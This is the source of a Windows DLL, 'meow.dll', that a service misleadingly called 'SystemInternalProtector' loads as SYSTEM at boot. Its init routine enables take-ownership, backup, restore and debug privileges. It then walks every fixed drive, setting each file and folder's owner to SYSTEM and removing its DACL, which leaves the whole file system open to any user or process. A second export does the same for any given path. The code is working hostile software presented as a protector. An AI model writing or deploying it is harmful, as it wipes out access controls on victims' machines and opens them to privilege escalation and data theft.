// ============================================================================
//  meow.dll — SYSTEM component (v0.2.0)
//  Loaded by the SystemInternalProtector service (SYSTEM context, boot).
//
//  Exports:
//    meow_init()      called once by the service host right after load:
//                     enables the full privilege set, writes the installed
//                     marker, then starts a background whole-drive ACL pass
//                     (owner -> SYSTEM, DACL removed = unrestricted access).
//    meow_access(path, recursive)
//                     on-demand grant: make a path (and optionally its tree)
//                     fully accessible, returns 0 on success.
//
//  Build:  cl /nologo /LD /O2 /utf-8 /W4 /wd4996 meow.cpp advapi32.lib /Fe:meow.dll
// ============================================================================
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <aclapi.h>
#include <sddl.h>

#include <atomic>
#include <cstdio>
#include <string>
#include <thread>

static volatile LONG g_walkActive = 0;

// ----------------------------------------------------------------------------
// logging (append-only, failure tolerant)
// ----------------------------------------------------------------------------
static void logLine(const wchar_t* msg) {
    wchar_t pd[MAX_PATH]{};
    DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", pd, MAX_PATH);
    std::wstring path = (dn && dn < MAX_PATH ? std::wstring(pd) : std::wstring(L"C:\\ProgramData"))
                        + L"\\SVOnline\\meow.log";
    HANDLE h = CreateFileW(path.c_str(), FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    SYSTEMTIME st{};
    GetLocalTime(&st);
    char buf[640]{};
    int n = std::sprintf(buf, "[%02u-%02u %02u:%02u:%02u] %S\n",
                         st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
    if (n > 0) {
        DWORD wr = 0;
        WriteFile(h, buf, static_cast<DWORD>(n), &wr, nullptr);
    }
    CloseHandle(h);
}

// ----------------------------------------------------------------------------
// privileges
// ----------------------------------------------------------------------------
static bool enablePrivilege(const wchar_t* name) {
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueW(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hTok, FALSE, &tp, 0, nullptr, nullptr);
        ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(hTok);
    return ok;
}

static PSID systemSid() {
    static BYTE buf[SECURITY_MAX_SID_SIZE];
    DWORD sz = sizeof(buf);
    return CreateWellKnownSid(WinLocalSystemSid, nullptr, buf, &sz) ? buf : nullptr;
}

// ----------------------------------------------------------------------------
// grant: owner -> SYSTEM, DACL removed (null DACL = unrestricted access)
// ----------------------------------------------------------------------------
static DWORD grantFullControl(const std::wstring& path) {
    PSID owner = systemSid();
    if (!owner) return ERROR_GEN_FAILURE;
    return SetNamedSecurityInfoW(const_cast<wchar_t*>(path.c_str()), SE_FILE_OBJECT,
                                 OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION |
                                     PROTECTED_DACL_SECURITY_INFORMATION,
                                 owner, nullptr, nullptr, nullptr);
}

// ----------------------------------------------------------------------------
// recursive walk
// ----------------------------------------------------------------------------
struct WalkState {
    ULONGLONG processed = 0;
    ULONGLONG failed = 0;
};

static void walk(const std::wstring& dir, WalkState& st, int depth) {
    if (depth > 64) return;
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd{};
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        DWORD err = grantFullControl(full);
        ++st.processed;
        if (err != ERROR_SUCCESS) ++st.failed;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) walk(full, st, depth + 1);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

// ----------------------------------------------------------------------------
// boot pass: every fixed drive, background thread
// ----------------------------------------------------------------------------
static void bootPass() {
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; ++i) {
        if (!(mask & (1u << i))) continue;
        wchar_t root[4] = { static_cast<wchar_t>(L'A' + i), L':', L'\\', 0 };
        if (GetDriveTypeW(root) != DRIVE_FIXED) continue;
        WalkState st;
        logLine((std::wstring(L"drive walk start: ") + root).c_str());
        grantFullControl(std::wstring(root));
        walk(root, st, 1);
        logLine((std::wstring(L"drive walk done: ") + root + L" processed=" +
                 std::to_wstring(st.processed) + L" failed=" + std::to_wstring(st.failed))
                    .c_str());
    }
    InterlockedExchange(&g_walkActive, 0);
}

// ----------------------------------------------------------------------------
// exports
// ----------------------------------------------------------------------------
extern "C" __declspec(dllexport) int __stdcall meow_init(void) {
    enablePrivilege(L"SeTakeOwnershipPrivilege");
    enablePrivilege(L"SeBackupPrivilege");
    enablePrivilege(L"SeRestorePrivilege");
    enablePrivilege(L"SeDebugPrivilege");

    wchar_t user[64]{};
    DWORD n = 64;
    GetUserNameW(user, &n);

    wchar_t dir[MAX_PATH]{};
    DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", dir, MAX_PATH);
    if (dn == 0 || dn >= MAX_PATH) wcscpy_s(dir, L"C:\\ProgramData");
    std::wstring marker = std::wstring(dir) + L"\\SVOnline\\installed.txt";

    HANDLE h = CreateFileW(marker.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        char buf[256]{};
        int len = std::sprintf(buf, "meow.dll loaded as %S\n", user);
        DWORD wr = 0;
        WriteFile(h, buf, static_cast<DWORD>(len), &wr, nullptr);
        CloseHandle(h);
    }

    if (InterlockedCompareExchange(&g_walkActive, 1, 0) == 0) {
        std::thread(bootPass).detach();
    }
    return 0;
}

extern "C" __declspec(dllexport) int __stdcall meow_access(const wchar_t* path, int recursive) {
    if (!path || !*path) return 1;
    DWORD err = grantFullControl(path);
    if (err != ERROR_SUCCESS) return 2;
    if (recursive) {
        WalkState st;
        walk(path, st, 1);
        if (st.failed) return 3;
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) {
    return TRUE;
}
